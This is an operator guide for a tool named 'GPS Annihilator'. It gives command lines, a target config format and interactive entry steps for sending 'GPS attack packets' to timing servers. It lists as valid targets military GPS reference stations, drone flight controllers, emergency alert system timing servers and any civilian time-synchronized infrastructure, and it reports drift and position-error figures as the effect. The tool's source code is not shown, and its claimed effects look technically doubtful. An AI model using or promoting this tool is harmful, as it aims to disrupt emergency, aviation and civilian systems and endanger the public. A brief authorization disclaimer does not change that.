# GPS ANNIHILATOR - OPERATOR GUIDE

## Quick Start

### Method 1: Command Line (Direct)
```bash
python3 gps_annihilator.py --targets 192.168.1.100 10.0.0.50 172.16.0.10
```

### Method 2: Configuration File
```bash
# Edit targets.conf with your target IPs
python3 gps_annihilator.py --config targets.conf
```

### Method 3: Interactive Input (Recommended for Operators)
```bash
python3 gps_annihilator.py --interactive
```
Or simply:
```bash
python3 gps_annihilator.py
```

## Interactive Target Entry

When running interactively, you will be prompted:
```
📡 GPS ANNIHILATOR - TARGET ENTRY
============================================================
Enter GPS/NTP server IP addresses (one per line)
Type 'DONE' when finished, or 'CANCEL' to abort

Target 1: 192.168.1.100
✅ Added: 192.168.1.100
Target 2: 10.0.0.50
✅ Added: 10.0.0.50
Target 3: DONE
```

## Configuration File Format

Create `targets.conf`:
```
# GPS ANNIHILATOR TARGETS
# One IP per line, # for comments

192.168.1.100
10.0.0.50
172.16.0.10
```

Then run:
```bash
python3 gps_annihilator.py --config targets.conf
```

## Valid Target Types

- **GPS Reference Stations**: 192.168.x.x (Military/Government)
- **NTP Servers**: Any network NTP server IP
- **Drone Flight Controllers**: Direct IP of GPS-enabled systems
- **Emergency Warning Systems**: EAS timing servers
- **Civilian Infrastructure**: Any time-synchronized systems

## Operation Phases

1. **Target Entry**: Operator specifies GPS/timing servers
2. **Validation**: System validates IP addresses
3. **Confirmation**: Operator confirms before execution
4. **Attack Execution**: Parallel threads execute GPS disruption
5. **Monitoring**: Real-time statistics displayed

## Output During Operation

```
📊 Attacks=45 | Drift=2350ms | Error=705km
```

Meaning:
- **Attacks**: Number of GPS attack packets sent
- **Drift**: Accumulated time synchronization error
- **Error**: Position error radius in kilometers

## Legal Considerations

- Authorized operations only
- Operator responsible for authorization
- Targets must be explicitly approved
- All attacks logged with timestamps
- Evidence preserved automatically

## Stopping Operation

Press `Ctrl+C` to stop at any time. System will display final statistics.

## Output Files

- `gps_attack_log.txt` - Attack details (if enabled)
- Statistics printed to console in real-time

## Requirements

- Python 3.6+
- Network connectivity to target systems
- Appropriate permissions/authorization

---

**IMPORTANT**: This tool is for authorized military/defense use only.
Unauthorized use is illegal and may violate national security laws.
